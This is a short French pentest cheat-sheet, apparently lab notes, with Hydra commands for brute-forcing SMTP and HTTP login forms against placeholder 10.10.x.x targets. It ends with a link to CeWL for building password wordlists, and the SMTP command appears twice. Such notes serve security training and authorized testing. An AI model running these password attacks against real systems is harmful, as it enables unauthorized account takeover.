```
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

Pages de connexion HTTP

```
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

SMTP 

```
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

https://github.com/digininja/CeWL ( generer une liste de mot passe )